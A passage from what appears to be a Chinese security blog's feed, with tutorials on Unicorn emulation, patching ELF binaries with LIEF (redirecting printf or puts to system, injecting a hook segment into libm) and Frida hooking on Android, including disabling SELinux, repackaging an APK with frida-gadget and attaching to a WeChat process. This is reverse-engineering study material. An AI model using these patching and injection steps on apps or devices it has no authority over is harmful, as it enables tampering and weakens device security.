读取寄存器的值。</li><li><p>mu.emu_start(ADDRESS_START, ADDRESS_END) 开始模拟。</p></li><li><p>指令跟踪：<br>这段代码添加了一个钩子。我们定义了函数hook_code，在模拟每个指令之前调用，该函数需要以下参数：<br>1、Uc实例<br>2、指令的地址<br>3、指令的大小<br>4、用户数据（我们可以在hook_add()的可选参数中传递这个值）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def hook_code(mu, address, size, user_data):  </span><br><span class="line">    print(&apos;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&apos; %(address, size))  </span><br><span class="line"></span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br></pre></td></tr></table></figure></li></ul><p>参考资料：</p><ol><li><a href="https://github.com/unicorn-engine/unicorn/tree/master/bindings/python" target="_blank" rel="noopener">https://github.com/unicorn-engine/unicorn/tree/master/bindings/python</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>使用lief对ELF文件Patch</title>
      <link href="/2018/03/13/%E4%BD%BF%E7%94%A8lief%E5%AF%B9ELF%E6%96%87%E4%BB%B6Patch/"/>
      <url>/2018/03/13/%E4%BD%BF%E7%94%A8lief%E5%AF%B9ELF%E6%96%87%E4%BB%B6Patch/</url>
      
        <content type="html"><![CDATA[<h1 id="LIEF"><a href="#LIEF" class="headerlink" title="LIEF"></a>LIEF</h1><p>LIEF可以很方便的对elf， pe，MachO 文件进行parse和patch，由于其提供了python库，故可以实现跨平台。</p><p>这里以Android平台为例进行测试。</p><h1 id="直接修改目标elf的导入符号"><a href="#直接修改目标elf的导入符号" class="headerlink" title="直接修改目标elf的导入符号"></a>直接修改目标elf的导入符号</h1><p><strong>注：直接修改符号一般适用于修改前后参数类型、个数完全相同的情况</strong></p><p>二进制文件代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;id&quot;);</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">Android.mk</span><br><span class="line">LOCAL_PATH := $(call my-dir)</span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_MODULE := lief_test</span><br><span class="line">LOCAL_SRC_FILES := main.c</span><br><span class="line">LOCAL_CFLAGS += -pie -fPIE</span><br><span class="line">LOCAL_LDFLAGS += -pie -fPIE</span><br><span class="line">include $(BUILD_EXECUTABLE)</span><br><span class="line">*/</span><br></pre></td></tr></table></figure></p><p>编译完成后，push到手机中，运行如下图：</p><p><img src="/images/pasted-24.png" alt="upload successful"></p><p>使用lief，直接将导入表中的printf符号替换为system<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lief</span><br><span class="line">binary = lief.parse(<span class="string">"lief_test"</span>)</span><br><span class="line">puts_sym = filter(<span class="keyword">lambda</span> e: e.name == <span class="string">"printf"</span>, binary.dynamic_symbols)[<span class="number">0</span>]</span><br><span class="line">puts_sym.name = <span class="string">"system"</span></span><br><span class="line">binary.write(<span class="string">"lief_test_patch"</span>);</span><br></pre></td></tr></table></figure></p><p>将lief_test_patch push到手机中，执行结果如下图：</p><p><img src="/images/pasted-25.png" alt="upload successful"></p><h1 id="修改-libc-中的相关符号，然后使用-LD-LIBRARY-PATH-加载修改后的库"><a href="#修改-libc-中的相关符号，然后使用-LD-LIBRARY-PATH-加载修改后的库" class="headerlink" title="修改 libc 中的相关符号，然后使用 LD_LIBRARY_PATH 加载修改后的库"></a>修改 libc 中的相关符号，然后使用 LD_LIBRARY_PATH 加载修改后的库</h1><p><strong>这里需要搞清楚elf加载的lib位置，例如我在一个64bit手机上做实验，那么加载的lib位于/system/lib64/libc.so, 32bit的libc.so位于/system/lib/libc.so</strong><br><strong>使用LD_LIBRARY_PATH=xxx 指定动态链接库的路径 </strong></p><p>先上实例代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"id"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"finished\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里要实现libc中的puts和system互换,使用lief<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lief</span><br><span class="line">libc = lief.parse(<span class="string">"libc.so"</span>)</span><br><span class="line">system_sym = filter(<span class="keyword">lambda</span> e: e.name == <span class="string">"system"</span>, libc.dynamic_symbols)[<span class="number">0</span>]</span><br><span class="line">puts_sym = filter(<span class="keyword">lambda</span> e: e.name == <span class="string">"puts"</span>, libc.dynamic_symbols)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">//注意不能出现两个一样的symbol</span><br><span class="line">puts_sym.name = <span class="string">"system"</span></span><br><span class="line">system_sym.name = <span class="string">"puts"</span></span><br><span class="line">libc.write(<span class="string">"libc_patch"</span>);</span><br></pre></td></tr></table></figure></p><p>将patch后的libc_patch重命名为libc.so，并与要执行的elf文件放在同一目录内，更改其链接库的path并执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb push libc_patch /data/local/tmp</span><br><span class="line">cd /data/local/tmp</span><br><span class="line">mv libc_patch libc.so</span><br><span class="line">LD_LIBRARY_PATH=. ./lief_test</span><br></pre></td></tr></table></figure></p><p>执行结果如下图所示：</p><p><img src="/images/pasted-26.png" alt="upload successful"></p><h1 id="直接添加代码"><a href="#直接添加代码" class="headerlink" title="直接添加代码"></a>直接添加代码</h1><p><strong>经测试printf，system等函数好像不行，会报segment fault错误，待研究 </strong></p><p>示例代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">  if (argc != 2) &#123;</span><br><span class="line">    printf(&quot;Usage: %s &lt;a&gt; \n&quot;, argv[0]);</span><br><span class="line">    exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  int a = atoi(argv[1]);</span><br><span class="line">  printf(&quot;exp(%d) = %f\n&quot;, a, exp(a));</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>目标是hook exp 函数，直接增加一个 segments , 然后劫持函数指针到这里。首先编译一个 lib 用来提供用于 hook 的代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//test.c</span><br><span class="line">double hook(double x) &#123;</span><br><span class="line">  return x + 100;</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">LOCAL_PATH := $(call my-dir)</span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_MODULE := hook</span><br><span class="line">LOCAL_SRC_FILES := test.c</span><br><span class="line">#LOCAL_CFLAGS += -pic -fPIC</span><br><span class="line">#LOCAL_LDFLAGS += -pic -fPIC</span><br><span class="line">include $(BUILD_SHARED_LIBRARY)</span><br><span class="line">*/</span><br></pre></td></tr></table></figure></p><p>exp函数在libm库中，因此将手机中的/system/lib/libm.so导出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import lief</span><br><span class="line"> </span><br><span class="line">libm = lief.parse(&quot;libm.so&quot;)</span><br><span class="line">hook = lief.parse(&quot;libhook.so&quot;)</span><br><span class="line"> </span><br><span class="line">segment_added = libm.add(hook.segments[0])</span><br><span class="line"> </span><br><span class="line">print(&quot;Hook inserted at VA: 0x&#123;:06x&#125;&quot;.format(segment_added.virtual_address))</span><br><span class="line"> </span><br><span class="line">exp_symbol = libm.get_symbol(&quot;exp&quot;)</span><br><span class="line">hook_symbol = hook.get_symbol(&quot;hook&quot;)</span><br><span class="line"> </span><br><span class="line">exp_symbol.value = segment_added.virtual_address + hook_symbol.value</span><br><span class="line"> </span><br><span class="line">libm.write(&quot;libm.so.6&quot;)</span><br></pre></td></tr></table></figure></p><p>运行结果如下图所示：</p><p><img src="/images/pasted-27.png" alt="upload successful"></p><h1 id="通过-got-plt-表-直接劫持程序"><a href="#通过-got-plt-表-直接劫持程序" class="headerlink" title="通过 got/plt 表 直接劫持程序"></a>通过 got/plt 表 直接劫持程序</h1><p>未测试成功<br><a href="https://lief-project.github.io/doc/latest/tutorials/05_elf_infect_plt_got.html" target="_blank" rel="noopener">https://lief-project.github.io/doc/latest/tutorials/05_elf_infect_plt_got.html</a></p><h1 id="修改一个可执行文件为链接库"><a href="#修改一个可执行文件为链接库" class="headerlink" title="修改一个可执行文件为链接库"></a>修改一个可执行文件为链接库</h1><p>对于一个PIE的elf，如果想直接调用其中的某个函数，可以通过lief将其修改为library，通过dlopen/dlsym来调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">//__attribute__ ((visibility (&quot;hidden&quot;))) 避免编译器自动导出</span><br><span class="line">//__attribute__ ((noinline)) 取消内嵌优化</span><br><span class="line">#define LOCAL    __attribute__ ((visibility (&quot;hidden&quot;)))</span><br><span class="line">#define NOINLINE __attribute__ ((noinline))</span><br><span class="line"></span><br><span class="line">NOINLINE LOCAL int check(char* input) &#123;</span><br><span class="line">  if (strcmp(input, &quot;easy&quot;) == 0) &#123;</span><br><span class="line">    return 1;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line"></span><br><span class="line">  if (argc != 2) &#123;</span><br><span class="line">    printf(&quot;Usage: %s flag\n&quot;, argv[0]);</span><br><span class="line">    exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (check(argv[1])) &#123;</span><br><span class="line">    printf(&quot;Well done!\n&quot;);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    printf(&quot;Wrong!\n&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">//gcc crackme101.c -O0 -fPIE -pie -Wl,-strip-all -o crackme101.bin</span><br></pre></td></tr></table></figure><p>用IDA打开crackme101.bin，找到check函数的偏移地址，将其修改为导出函数:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import lief</span><br><span class="line">crackme101 = lief.parse(&quot;./crackme101.bin&quot;)</span><br><span class="line">crackme101.add_exported_function(0x72A, &quot;check_found&quot;)</span><br><span class="line">crackme101.write(&quot;libcrackme101.so&quot;)</span><br></pre></td></tr></table></figure></p><p>此时的libcrackme101.so既是一个library,又是一个可执行文件</p><p>实现对其调用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;dlfcn.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">typedef int(*check_t)(char*);</span><br><span class="line"></span><br><span class="line">int main (int argc, char** argv) &#123;</span><br><span class="line"></span><br><span class="line">  void* handler = dlopen(&quot;./libcrackme101.so&quot;, RTLD_LAZY);</span><br><span class="line">  check_t check_found = (check_t)dlsym(handler, &quot;check_found&quot;);</span><br><span class="line"></span><br><span class="line">  int output = check_found(argv[1]);</span><br><span class="line"></span><br><span class="line">  printf(&quot;Output of check_found(&apos;%s&apos;): %d\n&quot;, argv[1], output);</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>参考文档：</p><ol><li>使用lief和libfuzzer进行fuzz <a href="https://blahcat.github.io/2018/03/11/fuzzing-arbitrary-functions-in-elf-binaries/" target="_blank" rel="noopener">https://blahcat.github.io/2018/03/11/fuzzing-arbitrary-functions-in-elf-binaries/</a></li><li><a href="https://github.com/lief-project/LIEF" target="_blank" rel="noopener">https://github.com/lief-project/LIEF</a></li><li><a href="https://lief.quarkslab.com/doc/#tutorials" target="_blank" rel="noopener">https://lief.quarkslab.com/doc/#tutorials</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Android Hook 之 Frida</title>
      <link href="/2018/03/09/droid-Hook-%E2%80%94%E2%80%94-Frida/"/>
      <url>/2018/03/09/droid-Hook-%E2%80%94%E2%80%94-Frida/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Frida简介"><a href="#一、Frida简介" class="headerlink" title="一、Frida简介"></a>一、Frida简介</h2><p>Frida是一款流行的hook框架，通杀android\ios\linux\win\osx等各平台，相比xposed和substrace cydia更加便捷。Frida的官网为：<a href="http://www.frida.re/，其核心原理是实现了一套inline" target="_blank" rel="noopener">http://www.frida.re/，其核心原理是实现了一套inline</a> hook框架，在Andorid平台的具体原理可参考<a href="https://mabin004.github.io/2018/07/31/Mac%E4%B8%8A%E7%BC%96%E8%AF%91Frida/">这里</a>。</p><p>本文重点介绍Frida在android平台的使用。</p><h2 id="二、环境配置"><a href="#二、环境配置" class="headerlink" title="二、环境配置"></a>二、环境配置</h2><p>官方教程<a href="https://frida.re/docs/installation/，主要操作如下：" target="_blank" rel="noopener">https://frida.re/docs/installation/，主要操作如下：</a></p><ol><li>pip install frida-tools 安装frida环境</li><li>在root的手机上运行frida server端<ul><li>1.下载对应平台的frida-server (<a href="https://github.com/frida/frida/releases" target="_blank" rel="noopener">https://github.com/frida/frida/releases</a>)</li><li>2.adb push frida-server /data/lcoal/tmp</li><li>3.chmod 755 frida-server</li><li>4.setenforce 0(运行前关闭SELinux)</li><li>5../frida-server &amp;</li></ul></li><li>建立调试通道<ul><li>USB连接+默认端口号可直接略过</li><li>改变端口号需要 adb forward tcp:12345 tcp:12345</li></ul></li><li>完成配置，直接在PC端运行hook脚本即可</li></ol><p>需要注意的是，frida的客户端和服务度版本应该相同，否则会出现不可预知的其他错误。使用“frida –version” 查看frida的版本</p><h2 id="三、免root实现frida-hook（重打包）"><a href="#三、免root实现frida-hook（重打包）" class="headerlink" title="三、免root实现frida hook（重打包）"></a>三、免root实现frida hook（重打包）</h2><p>注意： 无root环境下frida的部分功能受限</p><ol><li><p>apktool反编译apk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apktool d test.apk -o test</span><br></pre></td></tr></table></figure></li><li><p>将对应版本的gadget拷贝到/lib目录<br>下载地址:<br><a href="https://github.com/frida/frida/releases/" target="_blank" rel="noopener">https://github.com/frida/frida/releases/</a></p></li><li><p>smali注入加载library,选择application类或者Activity入口.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const-string v0, &quot;frida-gadget&quot; </span><br><span class="line">invoke-static &#123;v0&#125;, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V</span><br></pre></td></tr></table></figure></li><li><p>回编译apk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apktool b -o newtest.apk test/</span><br></pre></td></tr></table></figure></li><li><p>重新签名安装运行.成功后启动app会有如下日志</p></li></ol><p>Frida: Listening on TCP port 27042</p><h2 id="四、frida-python模板"><a href="#四、frida-python模板" class="headerlink" title="四、frida-python模板"></a>四、frida-python模板</h2><p>以下为frida hook的框架代码，只需要修改jscode就可以实现自定义的hook<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import frida, sys</span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&apos;type&apos;] == &apos;send&apos;:</span><br><span class="line">        print(&quot;[*] &#123;0&#125;&quot;.format(message[&apos;payload&apos;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line">jscode = &quot;&quot;&quot;</span><br><span class="line">Java.perform(function () &#123;</span><br><span class="line">    // 要hook的类名</span><br><span class="line">    var MainActivity = Java.use(&apos;com.example.xxx.MainActivity&apos;);</span><br><span class="line">    // hook按钮点击事件</span><br><span class="line">    MainActivity.onClick.implementation = function (v) &#123;</span><br><span class="line">        console.log(&apos;hook onClick&apos;);       </span><br><span class="line">        //修改MainActivity中属性的值</span><br><span class="line">        this.m.value = 0;</span><br><span class="line">        this.n.value = 1;</span><br><span class="line">        this.cnt.value = 999;</span><br><span class="line">        //打印日志</span><br><span class="line">        console.log(&apos;Done:&apos; + JSON.stringify(this.cnt));</span><br><span class="line">        // 执行原始方法代码</span><br><span class="line">        this.onClick(v);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line"># 设置要注入的进程名或者pid</span><br><span class="line"># attach mode</span><br><span class="line">process = device.attach(&apos;com.tencent.mm&apos;)</span><br><span class="line"># spawn mode</span><br><span class="line">pid = device.spawn(&apos;com.tencent.mm&apos;)</span><br><span class="line">process = device.attach(pid)</span><br><span class="line">device.resume(pid)</span><br><span class="line"></span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(&apos;message&apos;, on_message)</span><br><span class="line">print(&apos;[*] Running hook&apos;)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure></p><h2 id="五、采坑记录"><a href="#五、采坑记录" class="headerlink" title="五、采坑记录"></a>五、采坑记录</h2><h3 id="1-延时hook问题"><a href="#1-延时hook问题" class="headerlink" title="1.延时hook问题"></a>1.延时hook问题</h3><p>spawn模式下，有时候hook的lib还没有被加载到，导致无法hook,选择hook的时机很关键。</p><p>可以在hook代码前，用enumerateModulesSync验证是否加载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var mod = Process.enumerateModulesSync();</span><br><span class="line">var modLen = mod.length;</span><br><span class="line">for (var i = 0; i &lt; modLen; i++) &#123;</span><br><span class="line">    console.log(&quot;[+] module: &quot; + mod[i][&apos;name&apos;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>确认是延时问题后，有以下几种解决办法：</p><ul><li>如果不在意时效性，启动时不加“–no-pause”，可以等一段时间后，手动”%resume”</li><li>使用setTimeout(func, delay) 函数延时</li><li>使用frida的Module.load()或Module.ensureInitialized()来手动加载lib</li><li>hook libart.so中的LoadNativeLibrary()或java层的System.loadLibrary(),判断加载完成特定so后，再进行后续的hook。</li></ul><p>（1）hook libart.so中的LoadNativeLibrary()代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">function readStdString(str) &#123;</span><br><span class="line">  if ((str.readU8() &amp; 1) === 1) &#123; // size LSB (=1) indicates if it&apos;s a long string</span><br><span class="line">    return str.add(2 * Process.pointerSize).readPointer().readUtf8String();    </span><br><span class="line">  &#125;</span><br><span class="line">  return str.add(1).readUtf8String();  </span><br><span class="line">&#125;</span><br><span class="line">//find LoadNativeLibrary address</span><br><span class="line">var LoadNativeLibrary_offset = 0;</span><br><span class="line">var JNIload_instruct_offset = 0;</span><br><span class="line">var mod_art = Process.findModuleByName(&quot;libart.so&quot;);</span><br><span class="line">if (mod_art) &#123;</span><br><span class="line">    var art_exports = mod_art.enumerateExports()</span><br><span class="line">    for (var i=0;i&lt;art_exports.length;i++ ) &#123;</span><br><span class="line">        if (art_exports[i].name.indexOf(&quot;LoadNativeLibrary&quot;) != -1) &#123;</span><br><span class="line">            console.log(&quot;find LoadNativeLibrary:&quot;+art_exports[i].name, art_exports[i].address);</span><br><span class="line">            LoadNativeLibrary_offset = art_exports[i].address.sub(mod_art.base); </span><br><span class="line">            console.log(&quot;LoadNativeLibrary offset: &quot;+LoadNativeLibrary_offset);    </span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//hook LoadNativeLibrary</span><br><span class="line">Interceptor.attach(mod_art.base.add(LoadNativeLibrary_offset), &#123;</span><br><span class="line">    onEnter: function (args) &#123;</span><br><span class="line">        this.pathName = readStdString(ptr(this.context.r2));</span><br><span class="line">        console.log(&quot;[*] [LoadNativeLibrary] in  pathName =&quot;, this.pathName);</span><br><span class="line">    &#125;,</span><br><span class="line">    onLeave: function (retval) &#123;</span><br><span class="line">        console.log(&quot;[*] [LoadNativeLibrary] out pathName =&quot;, this.pathName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>（2）hook System.loadLibrary()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">const System = Java.use(&apos;java.lang.System&apos;);</span><br><span class="line">const Runtime = Java.use(&apos;java.lang.Runtime&apos;);</span><br><span class="line">const SystemLoad_2 = System.loadLibrary.overload(&apos;java.lang.String&apos;);</span><br><span class="line">const VMStack = Java.use(&apos;dalvik.system.VMStack&apos;);</span><br><span class="line">SystemLoad_2.implementation = function(library) &#123;</span><br><span class="line">    //console.log(&quot;Loading dynamic library =&gt; &quot; + library);</span><br><span class="line">    try &#123;</span><br><span class="line">        const loaded = Runtime.getRuntime().loadLibrary0(VMStack.getCallingClassLoader(), library);</span><br><span class="line">        if(library.includes(&quot;DexHelper&quot;)) &#123;</span><br><span class="line">            console.log(&quot;loaded DexHelper...&quot;);</span><br><span class="line">            //此处添加对应的hook代码</span><br><span class="line">         &#125;</span><br><span class="line">        return loaded;</span><br><span class="line">    &#125; catch(ex) &#123;</span><br><span class="line">        console.log(ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="2-hook不上的原因"><a href="#2-hook不上的原因" class="headerlink" title="2. hook不上的原因"></a>2. hook不上的原因</h3><ul><li>要hook的函数是不是正好被打了热补丁？</li><li>hook的目标属于动态load, 需要确定时机或手动长期load到内存</li><li>hook的进程是否正确，比如com.tencent.mm有好几个进程</li></ul><p>对于多进程问题，参考child gating（<a href="https://frida.re/news/2018/04/28/frida-10-8-released/）和spawn" target="_blank" rel="noopener">https://frida.re/news/2018/04/28/frida-10-8-released/）和spawn</a> gating, 示例代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import codecs</span><br><span class="line">import frida</span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#device = frida.get_remote_device()</span><br><span class="line">device = frida.get_device_manager().enumerate_devices()[-1]</span><br><span class="line">print(device)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pending = []</span><br><span class="line">sessions = []</span><br><span class="line">scripts = []</span><br><span 